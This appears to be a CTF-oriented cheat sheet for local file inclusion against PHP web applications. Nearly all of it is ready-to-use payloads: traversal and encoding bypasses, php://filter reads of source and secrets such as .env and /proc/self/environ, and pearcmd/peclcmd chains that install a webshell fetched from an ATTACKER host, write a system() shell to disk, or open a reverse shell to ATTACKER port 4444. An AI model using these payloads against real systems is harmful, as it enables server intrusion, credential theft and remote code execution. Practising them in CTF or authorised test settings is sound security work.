# LFI

## Try

```text
../../../../flag.txt
..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252f%252e%252e%252fflag.txt
```

## Traversal

```text
/?file=/flag.txt
/?file=/etc/passwd
/?file=/proc/self/environ
/?file=/proc/self/cmdline
/?file=/app/.env
/?file=/var/www/html/.env
/?file=/var/log/nginx/access.log
/?file=php://filter/convert.base64-encode/resource=index.php
/?file=php://filter/convert.base64-encode/resource=/flag.txt
/?file=php://filter/zlib.deflate/convert.base64-encode/resource=/flag.txt
```

* Basic:\
  `/etc/passwd`, `../../../../etc/passwd`
* PHP Wrapper:\
  `?page=php://filter/convert.base64-encode/resource=index.php`

[https://hackmd.io/@LightSheng/ByrFtyaQp](https://hackmd.io/@LightSheng/ByrFtyaQp)<br>

## Find PHP Gadgets

```bash
docker compose up -d
docker compose exec app sh -lc 'find / -name "*.php" 2>/dev/null | head -100'
```

```text
/usr/local/lib/php/pearcmd.php
/usr/local/lib/php/peclcmd.php
/var/log/nginx/access.log
/proc/self/environ
```

## Bypass

```text
....//....//....//flag.txt
..././..././..././flag.txt
..%2f..%2f..%2fflag.txt
%252e%252e%252fetc%252fpasswd
..\..\..\flag.txt
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
```

## Read After LFI

1. App source: routes, templates, middleware, validators.
2. Config: `.env`, `config.py`, `settings.py`, `application.yml`, `composer.json`.
3. Secrets: Flask/Django secret, JWT secret, Rails `secret_key_base`.
4. Runtime: `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd`.
5. Writable targets: access logs, uploads, temp folders, session files.

```text
/?file=/app/app.py
/?file=/app/config.py
/?file=/app/package.json
/?file=/var/www/html/index.php
/?file=/var/www/html/composer.json
```

## LFI2RCE via pearcmd / peclcmd

Works when LFI can include PEAR/PECL helper PHP and query args are parsed as CLI argv.

### Find Utility

```text
/?file=/usr/local/lib/php/peclcmd.php
/?file=/usr/local/lib/php/pearcmd.php
/?file=../../../../usr/local/lib/php/peclcmd.php
/?file=..././..././..././usr/local/lib/php/peclcmd.php
```

### Install Package Webshell

```text
/?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/shell.tgz+&file=../../../../usr/local/lib/php/peclcmd.php
/?file=/tmp/pwn/usr/local/lib/php/PKG-1.0.0/PKG.php&cmd=id
```

### Write PHP With config-create

```text
/?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=../../../../usr/local/lib/php/pearcmd.php
/?file=/tmp/s.php&0=id
```

### run-tests One Shot

```bash
cmd="bash -c 'sh -i >& /dev/tcp/ATTACKER/4444 0>&1'"
curl "http://TARGET/?+run-tests+-i+-r\"system(hex2bin('$(printf %s "$cmd" | xxd -p -c 256)'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt&file=../../../../usr/local/lib/php/peclcmd.php"

```

## LFI2RCE via php filter chain

Use [PHP](php.md) for wrappers, filter chains, and webshell variants.

## References

* [HackTricks LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
* [Advanced pearcmd notes](https://hackmd.io/@LightSheng/ByrFtyaQp)
* [LFI RCE Cheat Sheet](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
